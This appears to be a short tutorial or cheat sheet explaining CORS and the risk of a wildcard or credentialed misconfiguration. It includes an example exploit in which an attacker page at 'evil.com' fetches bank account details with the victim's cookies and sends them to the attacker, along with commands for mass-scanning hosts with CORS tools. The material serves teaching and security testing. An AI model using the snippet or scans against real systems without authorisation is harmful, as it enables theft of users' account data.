
It is a browser security feature that controls how web pages can make requests to a different domain (called a cross-origin request).

A web page can only make requests to the same origin (same scheme + host + port) as the page itself.

https://shop.example.com
https://api.another-site.com
➡️ That’s a cross-origin request, and it’s blocked by default.

“Hey browser, it’s okay to allow requests from this other site — but only if I explicitly say so.”

```bash
Access-Control-Allow-Origin: https://shop.example.com
```

Client-side JavaScript (on https://shop.example.com):
```bash

fetch("https://api.example.com/data")
  .then(res => res.json())
  .then(data => console.log(data));
```


Since the request goes from shop.example.com → api.example.com, the browser checks:
So the server at api.example.com must respond with:
```bash

Access-Control-Allow-Origin: https://shop.example.com
```

##### What If CORS Is Misconfigured?

If the server responds with:
```bash
Access-Control-Allow-Origin: *
```


```bash

GET /account/details HTTP/1.1
Host: bank.com
Cookie: session=abc123

HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
{
  "username": "victim",
  "balance": "$1000"
}

```


Now an attacker’s site (evil.com) can do:

```bash
fetch("https://bank.com/account/details", { credentials: "include" })
  .then(res => res.text())
  .then(data => {
    // steal user data
    sendToAttacker(data);
  });
  
  The browser **sends the victim’s cookies** (if `Access-Control-Allow-Credentials: true` is set too!)

✅ The attacker can **read the sensitive account info**
  
```



Automation:
```bash
curl -H "Origin: http://example.com" -I https://domain.com/wp-json/
curl -H "Origin: http://example.com" -I https://domain.com/wp-json/ | grep -i -e "access-control-allow-origin" -e "access-control-allow-methods" -e "access-control-allow-credentials"

cat example.coms.txt | httpx -silent | nuclei -t nuclei-templates/vulnerabilities/cors/ -o cors_results.txt
python3 corsy.py -i subdomains_alive.txt -t 10 --headers "User-Agent: GoogleBot\nCookie: SESSION=Hacked"
python3 CORScanner.py -u https://example.com -d -t 10

```